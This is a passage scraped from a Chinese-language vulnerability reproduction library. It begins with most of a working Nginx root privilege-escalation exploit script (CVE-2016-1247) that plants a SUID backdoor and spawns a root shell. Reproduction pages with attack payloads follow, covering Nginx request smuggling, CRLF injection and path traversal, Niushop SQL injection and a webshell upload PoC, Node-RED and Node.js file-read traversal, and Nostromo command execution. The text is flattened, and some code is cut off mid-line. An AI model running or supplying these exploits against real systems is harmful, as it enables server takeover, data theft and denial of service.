ctrl_c() { echo -e \"\\n[+] Ctrl+C pressed\" cleanexit 0 } #intro cat ------------------------------- \\ \\ __---__ _- /--______ __--( / \\ )XXXXXXXXXXX\\v. .-XXX( O O )XXXXXXXXXXXXXXX- /XXX( U ) XXXXXXX\\ /XXXXX( )--_ XXXXXXXXXXX\\ /XXXXX/ ( O ) XXXXXX \\XXXXX\\ XXXXX/ / XXXXXX \\__ \\XXXXX XXXXXX__/ XXXXXX \\__----> ---___ XXX__/ XXXXXX \\__ / \\- --__/ ___/\\ XXXXXX / ___--/= \\-\\ ___/ XXXXXX '--- XXXXXX \\-\\/XXX\\ XXXXXX /XXXXX \\XXXXXXXXX \\ /XXXXX/ \\XXXXXX > _/XXXXX/ \\XXXXX--__/ __-- XXXX/ -XXXXXXXX--------------- XXXXXX- \\XXXXXXXXXXXXXXXXXXXXXXXXXX/ \"\"VXXXXXXXXXXXXXXXXXXV\"\" _eascii_ echo -e \"\\033[94m \\nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \\nnginxed-root.sh (ver. 1.0)\\n\" echo -e \"Discovered and coded by: \\n\\nDawid Golunski \\nhttps://legalhackers.com \\033[0m\" # Args if [ $# -lt 1 ]; then echo -e \"\\n[!] Exploit usage: \\n\\n$0 path_to_error.log \\n\" echo -e \"It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\\n\" exit 3 fi # Priv check echo -e \"\\n[+] Starting the exploit as: \\n\\033[94m`id`\\033[0m\" id | grep -q www-data if [ $? -ne 0 ]; then echo -e \"\\n[!] You need to execute the exploit as www-data user! Exiting.\\n\" exit 3 fi # Set target paths ERRORLOG=\"$1\" if [ ! -f $ERRORLOG ]; then echo -e \"\\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\\n\" exit 3 fi # [ Exploitation ] trap ctrl_c INT # Compile privesc preload library # echo -e \"\\n[+] Compiling the privesc shared library ($PRIVESCSRC)\" # cat $PRIVESCSRC # #define _GNU_SOURCE # #include # #include # #include # #include # #include # #include # #include # uid_t geteuid(void) { # static uid_t (*old_geteuid)(); # old_geteuid = dlsym(RTLD_NEXT, \"geteuid\"); # if ( old_geteuid() == 0 ) { # chown(\"$BACKDOORPATH\", 0, 0); # chmod(\"$BACKDOORPATH\", 04777); # unlink(\"/etc/ld.so.preload\"); # } # return old_geteuid(); # } # _solibeof_ # /bin/bash -c \"gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl\" # if [ $? -ne 0 ]; then # echo -e \"\\n[!] Failed to compile the privesc lib $PRIVESCSRC.\" # cleanexit 2; # fi # Prepare backdoor shell cp $BACKDOORSH $BACKDOORPATH echo -e \"\\n[+] Backdoor/low-priv shell installed at: \\n`ls -l $BACKDOORPATH`\" # Safety check if [ -f /etc/ld.so.preload ]; then echo -e \"\\n[!] /etc/ld.so.preload already exists. Exiting for safety.\" exit 2 fi # Symlink the log file rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG if [ $? -ne 0 ]; then echo -e \"\\n[!] Couldn't remove the $ERRORLOG file or create a symlink.\" cleanexit 3 fi echo -e \"\\n[+] The server appears to be \\033[94m(N)jinxed\\033[0m (writable logdir) ! :) Symlink created at: \\n`ls -l $ERRORLOG`\" # Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered curl http://localhost/ >/dev/null 2>/dev/null # Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily # rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am) echo -ne \"\\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...\" while :; do sleep 1 if [ -f /etc/ld.so.preload ]; then echo $PRIVESCLIB > /etc/ld.so.preload rm -f $ERRORLOG break; fi done # /etc/ld.so.preload should be owned by www-data user at this point # Inject the privesc.so shared library to escalate privileges echo $PRIVESCLIB > /etc/ld.so.preload echo -e \"\\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \\n`ls -l /etc/ld.so.preload`\" echo -e \"\\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload\" echo -e \"\\n[+] The /etc/ld.so.preload file now contains: \\n`cat /etc/ld.so.preload`\" chmod 755 /etc/ld.so.preload # Escalating privileges via the SUID binary (e.g. /usr/bin/sudo) echo -e \"\\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!\" sudo 2>/dev/null >/dev/null # Check for the rootshell ls -l $BACKDOORPATH ls -l $BACKDOORPATH | grep rws | grep -q root if [ $? -eq 0 ]; then echo -e \"\\n[+] Rootshell got assigned root SUID perms at: \\n`ls -l $BACKDOORPATH`\" echo -e \"\\n\\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\\033[0m\" else echo -e \"\\n[!] Failed to get root\" cleanexit 2 fi rm -f $ERRORLOG echo > $ERRORLOG # Use the rootshell to perform cleanup that requires root privilges $BACKDOORPATH -p -c \"rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB\" # Reset the logging to error.log $BACKDOORPATH -p -c \"kill -USR1 `pidof -s nginx`\" # Execute the rootshell echo -e \"\\n[+] Spawning the rootshell $BACKDOORPATH now! \\n\" $BACKDOORPATH -p -i # Job done. cleanexit 0 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:57 "},"Web安全/Nginx/（CVE-2017-7529）Nginx 越界读取缓存漏洞/（CVE-2017-7529）Nginx 越界读取缓存漏洞.html":{"url":"Web安全/Nginx/（CVE-2017-7529）Nginx 越界读取缓存漏洞/（CVE-2017-7529）Nginx 越界读取缓存漏洞.html","title":"（CVE-2017-7529）Nginx 越界读取缓存漏洞","keywords":"","body":"（CVE-2017-7529）Nginx 越界读取缓存漏洞 一、漏洞简介 Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括\"文件头\"+\"HTTP返回包头\"+\"HTTP返回包体\"。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的\"HTTP返回包体\"返回给用户。 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于\"HTTP返回包体\"前的\"文件头\"、\"HTTP返回包头\"等内容。 二、漏洞影响 Nginx Nginx:1.13.2 Nginx Nginx:1.13.1 Nginx Nginx:1.13.0 Nginx Nginx:1.11.13 Nginx Nginx:1.11.12 三、复现过程 运行测试环境： docker-compose up -d 访问http://www.0-sec.org:8080/，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。 调用python3 poc.py http://www.0-sec.org:8080/，读取返回结果 Nginx越界读取缓存漏洞/media/rId24.png) 可见，越界读取到了位于\"HTTP返回包体\"前的\"文件头\"、\"HTTP返回包头\"等内容。 如果读取有误，请调整poc.py中的偏移地址（605）。 poc #!/usr/bin/env python import sys import requests if len(sys.argv) 参考链接 https://vulhub.org/\\#/environments/nginx/CVE-2017-7529/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:58 "},"Web安全/Nginx/（CVE-2019-20372）Nginx error_page 请求走私漏洞/（CVE-2019-20372）Nginx error_page 请求走私漏洞.html":{"url":"Web安全/Nginx/（CVE-2019-20372）Nginx error_page 请求走私漏洞/（CVE-2019-20372）Nginx error_page 请求走私漏洞.html","title":"（CVE-2019-20372）Nginx error_page 请求走私漏洞","keywords":"","body":"（CVE-2019-20372）Nginx error_page 请求走私漏洞 一、漏洞简介 Nginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。 二、漏洞影响 Ngnix \\ 三、复现过程 错误配置 server { listen 80; server_name localhost; error_page 401 http://example.org; location / { return 401; } } server { listen 80; server_name notlocalhost; location /_hidden/index.html { return 200 'This should be hidden!'; } } 这时候我们可以向服务器发送以下请求 GET /a HTTP/1.1 Host: localhost Content-Length: 56 GET /_hidden/index.html HTTP/1.1 Host: notlocalhost 我们看一下服务器是怎么处理的 printf \"GET /a HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 56\\r\\n\\r\\nGET /_hidden/index.html HTTP/1.1\\r\\nHost: notlocalhost\\r\\n\\r\\n\" | ncat localhost 80 --noshutdown 等于说是吧两个请求都间接的执行了，我们看一下burp里面的返回值 HTTP/1.1 302 Moved Temporarily Server: nginx/1.17.6 Date: Fri, 06 Dec 2019 18:23:33 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Location: http://example.org 302 Found 302 Found nginx/1.17.6 HTTP/1.1 200 OK Server: nginx/1.17.6 Date: Fri, 06 Dec 2019 18:23:33 GMT Content-Type: text/html Content-Length: 22 Connection: keep-alive This should be hidden! 再一下nginx服务器里面的日志 172.17.0.1 - - [06/Dec/2019:18:23:33 +0000] \"GET /a HTTP/1.1\" 302 145 \"-\" \"-\" \"-\" 172.17.0.1 - - [06/Dec/2019:18:23:33 +0000] \"GET /_hidden/index.html HTTP/1.1\" 200 22 \"-\" Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:59 "},"Web安全/Nginx/（CVE-2020-12440）Nginx = 1.8.0 请求走私/（CVE-2020-12440）Nginx = 1.8.0 请求走私.html":{"url":"Web安全/Nginx/（CVE-2020-12440）Nginx = 1.8.0 请求走私/（CVE-2020-12440）Nginx = 1.8.0 请求走私.html","title":"（CVE-2020-12440）Nginx = 1.8.0 请求走私","keywords":"","body":"（CVE-2020-12440）Nginx \\ 一、漏洞简介 Nginx 1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。 二、漏洞影响 Nginx \\ 三、复现过程 Nginx Request GET /test.html HTTP/1.1 Host: www.0-sec.org Content-Length: 2 GET /poc.html HTTP/1.1 Host: www.0-sec.org Content-Length: 15 Response HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 01 May 2020 18:28:44 GMT Content-Type: text/html Content-Length: 33 Last-Modified: Thu, 30 Apr 2020 14:36:32 GMT Connection: keep-alive ETag: \"5eaae270-21\" Accept-Ranges: bytes Test Page! HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 01 May 2020 18:28:44 GMT Content-Type: text/html Content-Length: 15 Last-Modified: Thu, 30 Apr 2020 14:35:41 GMT Connection: keep-alive ETag: \"5eaae23d-f\" Accept-Ranges: bytes NGINX PoC File 其他例子 Request（200 OK + 405 Method Not Allowed） GET / HTTP/1.1 Host: www.0-sec.org Content-Length: 4 Transfer-Encoding : chunked 46 TRACE / HTTP/1.1 Host:www.0-sec.org Content-Length:15 kk 0s Response（200 OK + 405 Method Not Allowed） HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Tue, 21 Apr 2020 16:28:12 GMT Content-Type: text/html Content-Length: 612 Last-Modified: Tue, 21 Apr 2020 16:08:59 GMT Connection: keep-alive ETag: \"5e9f1a9b-264\" Accept-Ranges: bytes Welcome to nginx! body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } Welcome to nginx! If you see this page, the nginx web server is successfully installed and working. Further configuration is required. For online documentation and support please refer to nginx.org. Commercial support is available at nginx.com. Thank you for using nginx. HTTP/1.1 405 Not Allowed Server: nginx/1.18.0 Date: Tue, 21 Apr 2020 16:28:12 GMT Content-Type: text/html Content-Length: 157 Connection: close 405 Not Allowed 405 Not Allowed nginx/1.18.0 Request（200 OK + 404 Not Found） GET / HTTP/1.1 Host: www.0-sec.org Content-Length: 4 Transfer-Encoding : chunked 46 GET /404 HTTP/1.1 Host:www.0-sec.org Content-Length:15 kk 0s Response（200 OK + 404 Not Found） HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Tue, 21 Apr 2020 16:23:52 GMT Content-Type: text/html Content-Length: 612 Last-Modified: Tue, 21 Apr 2020 16:08:59 GMT Connection: keep-alive ETag: \"5e9f1a9b-264\" Accept-Ranges: bytes Welcome to nginx! body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } Welcome to nginx! If you see this page, the nginx web server is successfully installed and working. Further configuration is required. For online documentation and support please refer to nginx.org. Commercial support is available at nginx.com. Thank you for using nginx. HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Tue, 21 Apr 2020 16:23:52 GMT Content-Type: text/html Content-Length: 153 Connection: keep-alive 404 Not Found 404 Not Found nginx/1.18.0 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:00 "},"Web安全/Nginx/Nginx 解析漏洞/Nginx 解析漏洞.html":{"url":"Web安全/Nginx/Nginx 解析漏洞/Nginx 解析漏洞.html","title":"Nginx 解析漏洞","keywords":"","body":"Nginx 解析漏洞 一、漏洞简介 二、漏洞影响 Nginx 1.x 最新版 PHP 7.x最新版 三、复现过程 直接执行docker-compose up -d启动容器，无需编译。 访问http://www.0-sec.org/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。 正常显示： 增加/.php后缀，被解析成PHP文件： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:51 "},"Web安全/Nginx/Nginx 配置错误漏洞 add_header被覆盖/Nginx 配置错误漏洞 add_header被覆盖.html":{"url":"Web安全/Nginx/Nginx 配置错误漏洞 add_header被覆盖/Nginx 配置错误漏洞 add_header被覆盖.html","title":"Nginx 配置错误漏洞 add_header被覆盖","keywords":"","body":"Nginx 配置错误漏洞 add_header被覆盖 一、漏洞简介 二、漏洞影响 三、复现过程 Nginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。 如下列代码，整站（父块中）添加了CSP头： add_header Content-Security-Policy \"default-src 'self'\"; add_header X-Frame-Options DENY; location = /test1 { rewrite ^(.*)$ /xss.html break; } location = /test2 { add_header X-Content-Type-Options nosniff; rewrite ^(.*)$ /xss.html break; } 但/test2的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效： XSS可被触发： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:52 "},"Web安全/Nginx/Nginx 配置错误漏洞 CRLF注入漏洞/Nginx 配置错误漏洞 CRLF注入漏洞.html":{"url":"Web安全/Nginx/Nginx 配置错误漏洞 CRLF注入漏洞/Nginx 配置错误漏洞 CRLF注入漏洞.html","title":"Nginx 配置错误漏洞 CRLF注入漏洞","keywords":"","body":"Nginx 配置错误漏洞 CRLF注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 下面两种情景十分常见： 用户访问http://www.0-sec.org/aabbcc，自动跳转到https://www.0-sec.org/aabbcc 用户访问http://www.0-sec.org/aabbcc，自动跳转到http://www.0-sec.org/aabbcc 比如我的博客，访问http://www.0-sec.org/other/tinger.html，将会301跳转到https://www.0-sec.org/other/tinger.html。随着现在https的普及，很多站点都强制使用https访问，这样的跳转非常常见。 第二个场景主要是为了统一用户访问的域名，更加有益于SEO优化。 在跳转的过程中，我们需要保证用户访问的页面不变，所以需要从Nginx获取用户请求的文件路径。查看Nginx文档，可以发现有三个表示uri的变量： $uri $document_uri $request_uri 解释一下，1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）。Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。那么，如果运维配置了下列的代码： // 错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）： location / { return 302 https://$host$uri; } Payload: http://www.0-sec.org:8080/%0a%0dSet-Cookie:%20a=1，可注入Set-Cookie头。 参考链接 https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html https://vulhub.org/\\#/environments/nginx/insecure-configuration/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:54 "},"Web安全/Nginx/Nginx 配置错误漏洞 目录穿越漏洞/Nginx 配置错误漏洞 目录穿越漏洞.html":{"url":"Web安全/Nginx/Nginx 配置错误漏洞 目录穿越漏洞/Nginx 配置错误漏洞 目录穿越漏洞.html","title":"Nginx 配置错误漏洞 目录穿越漏洞","keywords":"","body":"Nginx 配置错误漏洞 目录穿越漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。 错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）： location /files { alias /home/; } Payload: http://www.0-sec.org:8081/files../ ，成功穿越到根目录： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:55 "},"Web安全/Niushop/Niushop sql注入/Niushop sql注入.html":{"url":"Web安全/Niushop/Niushop sql注入/Niushop sql注入.html","title":"Niushop sql注入","keywords":"","body":"Niushop sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 sql注入（一） order参数： http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7%27&attr_array[][2]=8&spec_array[]=9 attr_array参数： http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8%27&spec_array[]=9 直接上sqlmap sqlmap -u \"http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9\" --random-agent --batch --dbms \"mysql\" sqlmap -u \"http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9\" --random-agent --batch --dbms \"mysql\" --current-db sql注入（二） GET /index.php?s=/wap/Goods/promotionZone&group_id=*&page=1 HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://172.16.209.129:8085/index.php/wap/goods/promotionZone X-Requested-With: XMLHttpRequest Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735 Connection: close 将数据包保存为niushop.txt sqlmap -r niushop.txt --random-agent --batch --dbms \"mysql\" sql注入（三） POST /index.php?s=/wap/Goods/goodsSearchList HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://172.16.209.129:8086/index.php/wap/goods/goodsSearchList Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 66 Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735 Connection: close Cache-Control: max-age=0 sear_name=&sear_type=1&order=*&sort=asc&controlType=&shop_id=0&page=1 数据包保存为niushop.txt sqlmap -r niushop.txt --random-agent --batch --dbms \"mysql Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:01 "},"Web安全/Niushop/Niushop 单商户 2.2 前台getshell/Niushop 单商户 2.2 前台getshell.html":{"url":"Web安全/Niushop/Niushop 单商户 2.2 前台getshell/Niushop 单商户 2.2 前台getshell.html","title":"Niushop 单商户 2.2 前台getshell","keywords":"","body":"Niushop 单商户 2.2 前台getshell 一、漏洞简介 二、漏洞影响 Version：单商户 2.2 三、复现过程 上传图片只做了前端校验，抓包改后缀即可绕过。 对文件内容做了检查，文件大小不能过大或过小，合成马最好放到中间。 请求包截图，删除不必要的参数仍旧能够上传。 所以导致前台getshell poc import requests session = requests.Session() paramsGet = {\"s\":\"/wap/upload/photoalbumupload\"} paramsPost = {\"file_path\":\"upload/goods/\",\"album_id\":\"30\",\"type\":\"1,2,3,4\"} paramsMultipart = [('file_upload', ('themin.php', \"\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x08\\x06\\x00\\x00\\x00\\x1f\\x15\\xc4\\x89\\x00\\x00\\x00\\x0bIDAT\\x08\\x99c\\xf8\\x0f\\x04\\x00\\x09\\xfb\\x03\\xfd\\xe3U\\xf2\\x9c\\x00\\x00\\x00\\x00IEND\\xaeB`\\x82\", 'application/octet-stream'))] headers = {\"Accept\":\"application/json, text/javascript, */*; q=0.01\",\"X-Requested-With\":\"XMLHttpRequest\",\"User-Agent\":\"Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0\",\"Referer\":\"http://127.0.0.1/index.php?s=/admin/goods/addgoods\",\"Connection\":\"close\",\"Accept-Language\":\"en\",\"Accept-Encoding\":\"gzip, deflate\"} cookies = {\"action\":\"finish\"} response = session.post(\"http://127.0.0.1/index.php\", data=paramsPost, files=paramsMultipart, params=paramsGet, headers=headers, cookies=cookies) print(\"Status code: %i\" % response.status_code) print(\"Response body: %s\" % response.content) 参考链接 https://y4er.com/post/niushop-getshell/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:02 "},"Web安全/Niushop/Niushop 单商户 2.2 爆破MySQL密码/Niushop 单商户 2.2 爆破MySQL密码.html":{"url":"Web安全/Niushop/Niushop 单商户 2.2 爆破MySQL密码/Niushop 单商户 2.2 爆破MySQL密码.html","title":"Niushop 单商户 2.2 爆破MySQL密码","keywords":"","body":"Niushop 单商户 2.2 爆破MySQL密码 一、漏洞简介 二、漏洞影响 Version：单商户 2.2 三、复现过程 安装爆破MySQL密码 GET /niushop/install.php?action=true&dbserver=127.0.0.1&dbpassword=root2&dbusername=root&dbname=niushop_b2c HTTP/1.1 Host: 127.0.0.1 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Referer: http://127.0.0.1/niushop/install.php?refresh Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: action=db Connection: close 爆破成功返回1，密码错误返回0 参考链接 https://y4er.com/post/niushop-getshell/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:04 "},"Web安全/Niushop/Niushop单商户V4版任意文件删除/Niushop单商户V4版任意文件删除.html":{"url":"Web安全/Niushop/Niushop单商户V4版任意文件删除/Niushop单商户V4版任意文件删除.html","title":"Niushop单商户V4版任意文件删除","keywords":"","body":"Niushop单商户V4版任意文件删除 漏洞描述 Niushop是一套开源的商城系统，存在任意文件删除漏洞 漏洞影响 Niushop FOFA title=\"Niushop\" 漏洞分析 漏洞位于： \\app\\shop\\controller\\Upload.php \\app\\shop\\controller\\common.php 可以看到由于没有清除参数或过滤所以导致任意文件删除 漏洞复现 为了测试，在跟目录下创建a.txt POC： 返回true即删除成功。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:05 "},"Web安全/Node-RED/Node-RED 任意文件下载漏洞/Node-RED 任意文件下载漏洞.html":{"url":"Web安全/Node-RED/Node-RED 任意文件下载漏洞/Node-RED 任意文件下载漏洞.html","title":"Node-RED 任意文件下载漏洞","keywords":"","body":"Node-RED 任意文件下载漏洞 漏洞描述 Node-RED存在任意文件下载漏洞，可造成信息泄露，源码泄露。 漏洞影响 Node-RED FOFA title=\"Node-RED\" 漏洞复现 页面如下： poc /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhosts Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:07 "},"Web安全/Node.js/（CVE-2017-14849）Node.js 目录穿越漏洞/（CVE-2017-14849）Node.js 目录穿越漏洞.html":{"url":"Web安全/Node.js/（CVE-2017-14849）Node.js 目录穿越漏洞/（CVE-2017-14849）Node.js 目录穿越漏洞.html","title":"（CVE-2017-14849）Node.js 目录穿越漏洞","keywords":"","body":"（CVE-2017-14849）Node.js 目录穿越漏洞 一、漏洞简介 原因是 Node.js 8.5.0 对目录进行normalize操作时出现了逻辑错误，导致向上层跳跃的时候（如../../../../../../etc/passwd），在中间位置增加foo/../（如../../../foo/../../../../etc/passwd），即可使normalize返回/etc/passwd，但实际上正确结果应该是../../../../../../etc/passwd。 express这类web框架，通常会提供了静态文件服务器的功能，这些功能依赖于normalize函数。比如，express在判断path是否超出静态目录范围时，就用到了normalize函数，上述BUG导致normalize函数返回错误结果导致绕过了检查，造成任意文件读取漏洞。 当然，normalize的BUG可以影响的绝非仅有express，更有待深入挖掘。不过因为这个BUG是node 8.5.0 中引入的，在 8.6 中就进行了修复，所以影响范围有限。 二、漏洞影响 Node.js 8.5.0 三、复现过程 GET /static/../../../a/../../../../etc/passwd HTTP/1.1 Host: www.0-sec.org:3000 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Node.js目录穿越漏洞/media/rId24.png) 参考链接 https://vulhub.org/\\#/environments/node/CVE-2017-14849/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:09 "},"Web安全/Nostromo httpd/（CVE-2019-16278）Nostromo httpd 命令执行/（CVE-2019-16278）Nostromo httpd 命令执行.html":{"url":"Web安全/Nostromo httpd/（CVE-2019-16278）Nostromo httpd 命令执行/（CVE-2019-16278）Nostromo httpd 命令执行.html","title":"（CVE-2019-16278）Nostromo httpd 命令执行","keywords":"","body":"（CVE-2019-16278）命令执行 一、漏洞简介 （CVE-2019-16278）命令执行 二、影响范围 三、复现过程 https://github.com/ianxtianxt/CVE-2019-16278/ ➜ Downloads python nostromo.py 114.114.114.114 8080 pwd /bin ➜ Downloads python nostromo.py 114.114.114.114 8080 id uid=65534 gid=65534 ➜ Downloads python nostromo.py 114.114.114.114 8080 \"ls -al\" drwxr-xr-x 2 0 0 0 Apr 12 2013 . drwxr-xr-x 16 0 0 0 Jan 1 1970 .. lrwxrwxrwx 1 0 0 7 Apr 12 2013 ash -> busybox Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:10 "},"Web安全/Nostromo httpd/（CVE-2019-16279）Nostromo httpd dos/（CVE-2019-16279）Nostromo httpd dos.html":{"url":"Web安全/Nostromo httpd/（CVE-2019-16279）Nostromo httpd dos/（CVE-2019-16279）Nostromo httpd dos.html","title":"（CVE-2019-16279）Nostromo httpd dos","keywords":"","body":"（CVE-2019-16279）dos 一、漏洞简介 （CVE-2019-16279）dos 二、影响范围 三、复现过程 This bug exploit a memory error when sending too many \\r\\n in a single connexion. Example $ curl http://127.0.0.1:8080 HELLO! $ ./CVE-2019-16279.sh 127.0.0.1 8080 $ curl http://127.0.0.1:8080 curl: (7) Failed to connect to 127.0.0.1 port 8080: Connection refused Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:11 "},"Web安全/OKLite/（CVE-2019-16131）OKLite v1.2.25 任意文件上传漏洞/（CVE-2019-16131）OKLite v1.2.25 任意文件上传漏洞.html":{"url":"Web安全/OKLite/（CVE-2019-16131）OKLite v1.2.25 任意文件上传漏洞/（CVE-2019-16131）OKLite v1.2.25 任意文件上传漏洞.html","title":"（CVE-2019-16131）OKLite v1.2.25 任意文件上传漏洞","keywords":"","body":"（CVE-2019-16131）OKLite v1.2.25 任意文件上传漏洞 一、漏洞简介 Ethan发现OKLite v1.2.25 存在任意文件上传漏洞（需要登录后台） 漏洞有两处，分别为：module_control.php；plugin_control.php 二、漏洞影响 OKLite v1.2.25 三、复现过程 module_control.php 在模块管理管理处导入模块，这里只能上传zip文件。把恶意文件放在zip压缩包中上传： (我这里是包含了一个shell.php，内容是phpinfo) OKLitev1.2.25任意文件上传漏洞/media/rId25.png) OKLitev1.2.25任意文件上传漏洞/media/rId26.png) 上传后又访问了另一个地址： OKLitev1.2.25任意文件上传漏洞/media/rId27.png) 上传之后就可以在data\\cache看到shell.php被解压出来了。 OKLitev1.2.25任意文件上传漏洞/media/rId28.png) plugin_control.php 和前一个module_control有所不同的是，这里的zip文件夹必须是包含一个文件夹，文件夹中再包含恶意文件。 插件中心： OKLitev1.2.25任意文件上传漏洞/media/rId30.png) 验证方式同前一个，就不重复了。 上传完成之后会访问另一个地址： http://localhost/admin.php?c=plugin&f=unzip&id=1196&_noCache=0.08112707662168439&_=1570257969464 参考链接 https://xz.aliyun.com/t/6515#toc-6 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:20 "},"Web安全/OKLite/（CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞/（CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞.html":{"url":"Web安全/OKLite/（CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞/（CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞.html","title":"（CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞","keywords":"","body":"（CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞 一、漏洞简介 Ethan发现OKLite v1.2.25 存在任意文件删除漏洞（需要登录后台） 后台删除文件时抓包修改title参数可以直接删除网站任意文件 二、漏洞影响 OKLite v1.2.25 版本 三、复现过程 1.进入后台 2.选择风格管理 OKLitev1.2.25存在任意文件删除漏洞/media/rId24.png) 3.进入文件管理 OKLitev1.2.25存在任意文件删除漏洞/media/rId25.png) 4.抓包，删除一个文件 OKLitev1.2.25存在任意文件删除漏洞/media/rId26.png) 5.拦截到请求后，改title为../../index.txt OKLitev1.2.25存在任意文件删除漏洞/media/rId27.png) 参考链接 